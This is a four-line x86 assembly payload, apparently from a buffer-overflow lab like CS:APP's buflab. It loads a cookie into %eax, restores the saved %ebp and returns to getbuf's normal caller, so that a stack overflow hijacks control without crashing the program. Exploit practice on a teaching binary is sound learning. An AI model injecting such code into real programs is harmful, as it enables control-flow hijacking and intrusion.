movl  $0x7c897d89,%eax  # move cookie into %eax
movl  $0x55683150,%ebp  # restore original %ebp value
pushl $0x08048c2e       # where getbuf would normally return
ret
	